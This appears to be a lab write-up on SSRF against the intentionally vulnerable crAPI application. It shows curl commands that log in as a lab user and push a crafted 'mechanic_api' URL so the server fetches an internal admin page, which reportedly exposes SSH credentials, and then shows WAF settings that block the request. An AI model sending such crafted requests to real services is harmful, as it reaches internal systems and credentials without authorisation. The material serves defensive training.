**OWASP API #7 — Server-Side Request Forgery (SSRF)**
>> SSRF happens when an attacker tricks a server into making a request to an unintended or malicious location. The attacker sends a crafted URL, and the vulnerable server performs that request — possibly to internal systems or sensitive endpoints that the attacker should never be able to reach.

## Demo Overview:
Using SSRF vulnerability to manipulate the requests made by a web application to access resources on internal systems "10.1.10.105/admin" that we should not have access to.

### Setup:
Testing with two hostnames 
	**crapi.local** |  crAPI Application protected by WAF
	**10.1.10.104** | crAPI Application Without WAF

### Users:
**Malicious User:** malicious@example.com/F5@Pass50 
## Discovering SSRF
- Login with user malicious
- When we visited the dashboard, we found the “<font color="#ffc000">Contact Mechanic</font>” Button
<img width="1194" height="1292" alt="image" src="https://github.com/user-attachments/assets/1fd70cf2-bd97-4cb4-8dca-113891401ac5" />

We discovered that the request had a parameter in the body called `mechanic_api` which contains a link to visit , so we could try to add external uri and check the response
<img width="1663" height="1021" alt="image" src="https://github.com/user-attachments/assets/400770d1-76a7-4652-a482-c68cb81a6eb4" />

## SSRF without WAF
try to access an external web app
```python unfold ln:false unwrap title:"code"
##login and get access token
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
##use access token to test SSRF
curl -X POST  http://10.1.10.104/workshop/api/merchant/contact_mechanic -d '{"mechanic_code":"TRAC_JHN","problem_details":"call me","vin":"8PK1LM7PB5YV9EEG0","mechanic_api":"https://google.com","repeat_request_if_failed":false,"number_of_repeats":1}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
<img width="2508" height="1219" alt="image" src="https://github.com/user-attachments/assets/b8f50912-37c4-49a5-b0ea-0973cc682f4c" />

that confirms that SSRF exists.
- Accessing an internal resource 10.1.10.105/admin
with more enumeration and directory indexing the attacker find admin directory on different internal server "10.1.10.105"
<img width="2497" height="295" alt="image" src="https://github.com/user-attachments/assets/a934fb41-bb54-4c59-ae63-503924c89ff1" />

exposed SSH credentials for another internal server..

## SSRF WAF protection 
### Configuration:
- JSON parse parameters
as parameter 'mechinic_api' is in JSON, we need to make sure WAF parse JSON parameters 
<img width="2063" height="1291" alt="image" src="https://github.com/user-attachments/assets/69fe9aa2-3b3a-471f-a66d-3053057a0708" />


- configure `mechnic_api` parameter
<img width="1027" height="947" alt="image" src="https://github.com/user-attachments/assets/a705e484-7c18-4df5-859f-4f3d7118af78" />


- enforce SSRF
<img width="2069" height="642" alt="image" src="https://github.com/user-attachments/assets/08d7788f-9d1a-4277-ae78-2206d1acb832" />


- check SSRF denied hosts
<img width="1311" height="1171" alt="image" src="https://github.com/user-attachments/assets/506d9228-c1e0-4846-8ef0-b84602c59bc9" />


### validation 
```zsh unfold ln:false unwrap title:"code"
##login and export access token
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
#use exported access token 
curl -X POST  http://crapi.local/workshop/api/merchant/contact_mechanic -d '{"mechanic_code":"TRAC_JHN","problem_details":"call me","vin":"8PK1LM7PB5YV9EEG0","mechanic_api":"http://10.1.10.105/admin","repeat_request_if_failed":false,"number_of_repeats":1}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```

<img width="2486" height="240" alt="image" src="https://github.com/user-attachments/assets/ce74dea7-a333-4d90-b596-93c984070422" />
<img width="2150" height="699" alt="image" src="https://github.com/user-attachments/assets/8e64a2f9-46fa-417e-bd58-f50a26778d0c" />

